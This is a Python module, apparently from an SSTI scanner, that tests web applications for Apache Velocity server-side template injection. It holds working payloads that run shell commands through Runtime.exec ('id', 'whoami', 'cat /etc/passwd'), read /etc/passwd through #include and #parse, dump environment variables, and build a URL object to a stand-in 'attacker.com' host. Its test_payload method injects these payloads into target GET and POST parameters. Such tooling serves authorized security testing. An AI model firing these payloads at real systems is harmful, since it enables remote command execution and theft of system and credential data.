"""
Velocity template engine detection module.

This module implements Server-Side Template Injection (SSTI) detection
for the Apache Velocity template engine, commonly used in Java applications.

Author: SSTI Scanner Team
License: MIT
"""

import re
import urllib.parse
from typing import List, Dict, Any, Optional

from .base import BaseTemplateEngine, EngineResult, ConfidenceLevel, Payload


class VelocityEngine(BaseTemplateEngine):
    """
    Velocity template engine detector.
    
    Apache Velocity is a Java-based template engine.
    It uses $variable syntax and #directive syntax.
    """
    
    def __init__(self, config):
        super().__init__(config)
        self.name = "velocity"
        self.description = "Apache Velocity template engine (Java)"
        self.payloads = self._load_payloads()
        
        # Velocity-specific patterns for detection
        self.detection_patterns = {
            'math_result': [
                r'\b49\b',  # 7*7
                r'\b64\b',  # 8*8
                r'\b121\b', # 11*11
            ],
            'object_disclosure': [
                r'org\.apache\.velocity',
                r'VelocityContext',
                r'java\.lang\.Object',
                r'java\.util\.',
                r'class java\.',
                r'Method.*?invoke',
            ],
            'variable_disclosure': [
                r'\$\{.*?\}',
                r'Reference.*?toString',
                r'velocity\.runtime',
                r'ResourceManager',
            ],
            'method_execution': [
                r'getClass\(\)',
                r'toString\(\)',
                r'hashCode\(\)',
                r'equals\(',
            ],
            'directive_execution': [
                r'#set.*?=',
                r'#if.*?#end',
                r'#foreach.*?#end',
                r'#include',
                r'#parse',
            ]
        }
    
    def _load_payloads(self) -> List[Payload]:
        """Load Velocity-specific SSTI payloads."""
        payloads = []
        
        # Basic math operations
        math_payloads = [
            "#set($x=7*7)$x",
            "#set($result=8*8)$result",
            "#set($calc=11*11)$calc",
            "$math.add(7,7)",
            "$math.mul(7,7)",
            "#evaluate('7*7')",
        ]
        
        for payload in math_payloads:
            payloads.append(Payload(
                payload=payload,
                type="math",
                context="html",
                description="Basic mathematical operation"
            ))
        
        # Variable access and disclosure
        variable_payloads = [
            "$context",
            "$velocityContext",
            "$request",
            "$response",
            "$session",
            "$application",
            "$ctx",
            "$velocityCount",
            "$foreach",
            "$esc",
            "$date",
            "$math",
            "$number",
            "$sorter",
            "$display",
        ]
        
        for payload in variable_payloads:
            payloads.append(Payload(
                payload=payload,
                type="variable_access",
                context="html",
                description="Variable access and disclosure"
            ))
        
        # Object method calls
        method_payloads = [
            "$context.getClass()",
            "$context.getClass().getName()",
            "$context.getClass().getClassLoader()",
            "$context.toString()",
            "$request.getClass()",
            "$request.getClass().getName()",
            "$request.getServletContext()",
            "$request.getSession()",
            "$application.getClass()",
            "$application.getAttribute('test')",
        ]
        
        for payload in method_payloads:
            payloads.append(Payload(
                payload=payload,
                type="method_call",
                context="html",
                description="Object method invocation"
            ))
        
        # Class loading and reflection
        class_payloads = [
            "$context.getClass().forName('java.lang.Runtime')",
            "$context.getClass().forName('java.lang.System')",
            "$context.getClass().forName('java.io.File')",
            "$context.getClass().forName('java.lang.ProcessBuilder')",
            "#set($class=$context.getClass().forName('java.lang.Runtime'))$class",
            "#set($rt=$context.getClass().forName('java.lang.Runtime'))$rt.getRuntime()",
        ]
        
        for payload in class_payloads:
            payloads.append(Payload(
                payload=payload,
                type="class_loading",
                context="html",
                description="Class loading and reflection"
            ))
        
        # Method invocation payloads
        invoke_payloads = [
            "#set($rt=$context.getClass().forName('java.lang.Runtime'))#set($process=$rt.getRuntime().exec('id'))$process",
            "#set($rt=$context.getClass().forName('java.lang.Runtime'))#set($process=$rt.getRuntime().exec('whoami'))$process",
            "#set($rt=$context.getClass().forName('java.lang.Runtime'))#set($process=$rt.getRuntime().exec('cat /etc/passwd'))$process",
            "#set($sys=$context.getClass().forName('java.lang.System'))$sys.getProperty('java.version')",
            "#set($sys=$context.getClass().forName('java.lang.System'))$sys.getProperty('user.name')",
            "#set($sys=$context.getClass().forName('java.lang.System'))$sys.getProperty('os.name')",
        ]
        
        for payload in invoke_payloads:
            payloads.append(Payload(
                payload=payload,
                type="code_execution",
                context="html",
                description="Method invocation for code execution"
            ))
        
        # Directive-based exploitation
        directive_payloads = [
            # Set directive
            "#set($test='TESTSTRING')$test",
            "#set($x=7)#set($y=7)#set($result=$x*$y)$result",
            
            # If directive
            "#if(7==7)VULNERABLE#end",
            "#if($context)CONTEXT_ACCESS#end",
            
            # Foreach directive
            "#foreach($item in [1,2,3])$item#end",
            "#foreach($key in $context.getKeys())$key#end",
            
            # Evaluate directive
            "#evaluate('$math.add(7,7)')",
            "#evaluate('$context.getClass()')",
            
            # Include/Parse (potential LFI)
            "#include('/etc/passwd')",
            "#parse('/etc/passwd')",
            "#include('file:///etc/passwd')",
            "#parse('file:///etc/passwd')",
        ]
        
        for payload in directive_payloads:
            payloads.append(Payload(
                payload=payload,
                type="directive",
                context="html",
                description="Directive-based exploitation"
            ))
        
        # Tool objects exploitation
        tool_payloads = [
            # Math tool
            "$math.add(7,7)",
            "$math.sub(14,7)",
            "$math.mul(7,7)",
            "$math.div(49,7)",
            "$math.pow(7,2)",
            
            # Date tool
            "$date.get('yyyy-MM-dd')",
            "$date.getTime()",
            "$date.toString()",
            
            # Number tool
            "$number.format('##.##', 49)",
            "$number.currency(49)",
            
            # Display tool
            "$display.list([1,2,3])",
            "$display.printf('%d', 49)",
            
            # Sorter tool
            "$sorter.sort([3,1,2])",
        ]
        
        for payload in tool_payloads:
            payloads.append(Payload(
                payload=payload,
                type="tool_object",
                context="html",
                description="Tool object exploitation"
            ))
        
        # URL-encoded payloads
        url_payloads = [
            "%23set%28%24x%3D7%2A7%29%24x",  # #set($x=7*7)$x
            "%24context",  # $context
            "%24context.getClass%28%29",  # $context.getClass()
        ]
        
        for payload in url_payloads:
            payloads.append(Payload(
                payload=payload,
                type="math",
                context="url",
                description="URL-encoded payload"
            ))
        
        # Context-specific payloads
        attr_payloads = [
            "x#set($y=7*7)$y",
            "#set($z=7*7)$z x",
            "x$context",
            "$context x",
        ]
        
        for payload in attr_payloads:
            payloads.append(Payload(
                payload=payload,
                type="math",
                context="attribute",
                description="Attribute context payload"
            ))
        
        # Advanced exploitation techniques
        advanced_payloads = [
            # ClassLoader manipulation
            "#set($loader=$context.getClass().getClassLoader())$loader",
            "#set($loader=$context.getClass().getClassLoader())$loader.loadClass('java.lang.Runtime')",
            
            # System properties access
            "#set($props=$context.getClass().forName('java.lang.System').getProperties())$props",
            "#set($env=$context.getClass().forName('java.lang.System').getenv())$env",
            
            # Security manager bypass attempts
            "#set($sm=$context.getClass().forName('java.lang.System').getSecurityManager())$sm",
            
            # Thread access
            "#set($thread=$context.getClass().forName('java.lang.Thread').currentThread())$thread",
            
            # File system access
            "#set($file=$context.getClass().forName('java.io.File').new('/etc/passwd'))$file",
            "#set($reader=$context.getClass().forName('java.io.FileReader').new('/etc/passwd'))$reader",
            
            # URL/Network access
            "#set($url=$context.getClass().forName('java.net.URL').new('http://attacker.com'))$url",
            
            # Scripting engine access
            "#set($engine=$context.getClass().forName('javax.script.ScriptEngineManager').new().getEngineByName('javascript'))$engine",
            
            # Error triggering for information disclosure
            "$undefined_variable",
            "$context.undefined_method()",
            "#set($error=$context.getClass().undefined_method())$error",
            "#include('nonexistent_file')",
            "#parse('nonexistent_file')",
        ]
        
        for payload in advanced_payloads:
            payloads.append(Payload(
                payload=payload,
                type="advanced",
                context="html",
                description="Advanced Velocity exploitation"
            ))
        
        return payloads
    
    async def test_payload(self, url: str, payload: str, **kwargs) -> EngineResult:
        """
        Test a single payload against the target URL.
        
        Args:
            url: Target URL
            payload: Payload to test
            **kwargs: Additional arguments (http_client, method, data, headers)
        
        Returns:
            EngineResult with test results
        """
        http_client = kwargs.get('http_client')
        method = kwargs.get('method', 'GET')
        data = kwargs.get('data', {})
        headers = kwargs.get('headers', {})
        
        if not http_client:
            return EngineResult(
                is_vulnerable=False,
                confidence=ConfidenceLevel.LOW,
                payload=payload,
                response="",
                evidence="No HTTP client provided",
                engine=self.name
            )
        
        try:
            # Determine injection point and method
            if method.upper() == 'GET':
                # URL parameter injection
                if '?' in url:
                    test_url = url.replace('INJECT', payload)
                    if 'INJECT' not in url:
                        # Add payload to first parameter
                        if '=' in url:
                            test_url = re.sub(r'(=)([^&]*)', f'\\1{payload}', url, count=1)
                        else:
                            test_url = f"{url}&test={payload}"
                    else:
                        test_url = url.replace('INJECT', payload)
                else:
                    test_url = f"{url}?test={payload}"
                
                response = await http_client.get(test_url, headers=headers)
            else:
                # POST data injection
                if data:
                    # Inject into existing data
                    test_data = data.copy()
                    if 'INJECT' in str(test_data):
                        test_data = {k: v.replace('INJECT', payload) if isinstance(v, str) else v 
                                   for k, v in test_data.items()}
                    else:
                        # Add payload to first field or create test field
                        if test_data:
                            first_key = next(iter(test_data))
                            test_data[first_key] = payload
                        else:
                            test_data['test'] = payload
                else:
                    test_data = {'test': payload}
                
                response = await http_client.post(url, data=test_data, headers=headers)
            
            # Analyze the response
            return self.analyze_response("", payload, response.get('text', ''))
            
        except Exception as e:
            return EngineResult(
                is_vulnerable=False,
                confidence=ConfidenceLevel.LOW,
                payload=payload,
                response="",
                evidence=f"Request failed: {str(e)}",
                engine=self.name
            )
    
    def analyze_response(self, original_response: str, payload: str, response: str) -> EngineResult:
        """
        Analyze response for Velocity SSTI indicators.
        
        Args:
            original_response: Original response (baseline)
            payload: Payload that was sent
            response: Response to analyze
        
        Returns:
            EngineResult with analysis results
        """
        if not response:
            return EngineResult(
                is_vulnerable=False,
                confidence=ConfidenceLevel.LOW,
                payload=payload,
                response=response,
                evidence="Empty response",
                engine=self.name
            )
        
        # Check for direct payload reflection (likely not vulnerable)
        if payload in response and not any(pattern in response.lower() for pattern in ['velocity', 'java.lang']):
            return EngineResult(
                is_vulnerable=False,
                confidence=ConfidenceLevel.LOW,
                payload=payload,
                response=response,
                evidence="Payload reflected without execution",
                engine=self.name
            )
        
        evidence_parts = []
        confidence = ConfidenceLevel.LOW
        is_vulnerable = False
        
        # Math operation detection
        if any(p in payload for p in ['7*7', '8*8', '11*11']):
            for pattern in self.detection_patterns['math_result']:
                if re.search(pattern, response):
                    evidence_parts.append(f"Mathematical operation executed: found {pattern}")
                    confidence = ConfidenceLevel.HIGH
                    is_vulnerable = True
                    break
        
        # Object disclosure detection
        for pattern in self.detection_patterns['object_disclosure']:
            if re.search(pattern, response, re.IGNORECASE):
                evidence_parts.append(f"Object disclosure detected: {pattern}")
                confidence = max(confidence, ConfidenceLevel.HIGH)
                is_vulnerable = True
        
        # Variable disclosure detection
        for pattern in self.detection_patterns['variable_disclosure']:
            if re.search(pattern, response, re.IGNORECASE):
                evidence_parts.append(f"Variable disclosure detected: {pattern}")
                confidence = max(confidence, ConfidenceLevel.MEDIUM)
                is_vulnerable = True
        
        # Method execution detection
        for pattern in self.detection_patterns['method_execution']:
            if re.search(pattern, response, re.IGNORECASE):
                evidence_parts.append(f"Method execution detected: {pattern}")
                confidence = max(confidence, ConfidenceLevel.HIGH)
                is_vulnerable = True
        
        # Velocity-specific error messages
        velocity_errors = [
            'org.apache.velocity.exception',
            'VelocityException',
            'ParseErrorException',
            'MethodInvocationException',
            'ResourceNotFoundException',
            'Unable to find resource',
            'Lexical error',
            'Was expecting one of',
            'Encountered.*?at line',
        ]
        
        for error in velocity_errors:
            if re.search(error, response, re.IGNORECASE):
                evidence_parts.append(f"Velocity error detected: {error}")
                confidence = max(confidence, ConfidenceLevel.MEDIUM)
                is_vulnerable = True
        
        # Java-specific indicators
        java_indicators = [
            'java.lang.Class',
            'java.lang.Runtime',
            'java.lang.System',
            'java.io.File',
            'java.util.',
            'getClass()',
            'getClassLoader()',
            'getMethod(',
            'invoke(',
        ]
        
        for indicator in java_indicators:
            if re.search(indicator, response, re.IGNORECASE):
                evidence_parts.append(f"Java class/method access detected: {indicator}")
                confidence = max(confidence, ConfidenceLevel.HIGH)
                is_vulnerable = True
        
        # Check for context object disclosure
        if '$context' in payload or '$velocityContext' in payload:
            context_patterns = [
                r'VelocityContext',
                r'org\.apache\.velocity',
                r'Context.*?object',
                r'velocity\.runtime',
            ]
            
            for pattern in context_patterns:
                if re.search(pattern, response, re.IGNORECASE):
                    evidence_parts.append(f"Context object disclosure: {pattern}")
                    confidence = max(confidence, ConfidenceLevel.HIGH)
                    is_vulnerable = True
        
        # Check for successful #set directive execution
        if '#set(' in payload:
            # Look for the variable being output
            set_match = re.search(r'#set\(\$(\w+)=.*?\)\$\1', payload)
            if set_match:
                var_name = set_match.group(1)
                if var_name in response:
                    evidence_parts.append(f"Set directive executed: variable ${var_name} found in response")
                    confidence = max(confidence, ConfidenceLevel.HIGH)
                    is_vulnerable = True
        
        # Check for tool object access
        if any(tool in payload for tool in ['$math', '$date', '$number', '$display', '$sorter']):
            tool_patterns = [
                r'\d+',  # Numbers from math operations
                r'\d{4}-\d{2}-\d{2}',  # Date format
                r'[A-Z][a-z]{2}\s+[A-Z][a-z]{2}\s+\d{2}',  # Date format
            ]
            
            for pattern in tool_patterns:
                if re.search(pattern, response):
                    evidence_parts.append(f"Tool object execution detected: {pattern}")
                    confidence = max(confidence, ConfidenceLevel.HIGH)
                    is_vulnerable = True
        
        # Check for conditional directive execution
        if '#if(' in payload and '#end' in payload:
            # Look for the content between if/end
            if_match = re.search(r'#if\([^)]*\)([^#]+)#end', payload)
            if if_match:
                content = if_match.group(1).strip()
                if content and content in response:
                    evidence_parts.append(f"Conditional directive executed: {content}")
                    confidence = max(confidence, ConfidenceLevel.HIGH)
                    is_vulnerable = True
        
        # Check for foreach directive execution
        if '#foreach(' in payload and '#end' in payload:
            foreach_patterns = [
                r'123',  # Common output from [1,2,3]
                r'012',  # Zero-indexed
                r'111',  # Repeated content
            ]
            
            for pattern in foreach_patterns:
                if pattern in response:
                    evidence_parts.append(f"Foreach directive executed: {pattern}")
                    confidence = max(confidence, ConfidenceLevel.HIGH)
                    is_vulnerable = True
        
        # System property disclosure
        system_props = [
            'java.version',
            'user.name',
            'os.name',
            'java.home',
            'user.dir',
        ]
        
        for prop in system_props:
            if prop in response:
                evidence_parts.append(f"System property disclosed: {prop}")
                confidence = max(confidence, ConfidenceLevel.HIGH)
                is_vulnerable = True
        
        # Check for specific test strings
        test_strings = [
            'TESTSTRING',
            'VULNERABLE',
            'CONTEXT_ACCESS',
        ]
        
        for test_str in test_strings:
            if test_str in response:
                evidence_parts.append(f"Test string found: {test_str}")
                confidence = max(confidence, ConfidenceLevel.HIGH)
                is_vulnerable = True
        
        # Compile evidence
        if evidence_parts:
            evidence = "Velocity SSTI detected: " + "; ".join(evidence_parts)
        else:
            evidence = "No Velocity SSTI indicators found"
            
        return EngineResult(
            is_vulnerable=is_vulnerable,
            confidence=confidence,
            payload=payload,
            response=response[:500],  # Limit response size
            evidence=evidence,
            engine=self.name
        )
    
    def get_payloads_for_context(self, context: str) -> List[Payload]:
        """Get payloads suitable for a specific context."""
        return [p for p in self.payloads if p.context == context]
    
    def get_payloads_by_type(self, payload_type: str) -> List[Payload]:
        """Get payloads of a specific type."""
        return [p for p in self.payloads if p.type == payload_type]
    
    def encode_payload(self, payload: str, context: str) -> str:
        """
        Encode payload for specific context.
        
        Args:
            payload: Original payload
            context: Target context (url, html, attribute, etc.)
        
        Returns:
            Encoded payload
        """
        if context == "url":
            return urllib.parse.quote(payload)
        elif context == "html":
            return payload.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;')
        elif context == "attribute":
            return payload.replace('"', '&quot;').replace("'", '&#x27;')
        elif context == "javascript":
            return payload.replace('\\', '\\\\').replace('"', '\\"').replace("'", "\\'")
        else:
            return payload
    
    def get_info(self) -> Dict[str, Any]:
        """Get engine information."""
        return {
            'name': self.name,
            'description': self.description,
            'payloads': len(self.payloads),
            'contexts': list(set(p.context for p in self.payloads)),
            'types': list(set(p.type for p in self.payloads)),
            'framework': 'Apache Velocity',
            'language': 'Java',
            'syntax': '$variable and #directive'
        }
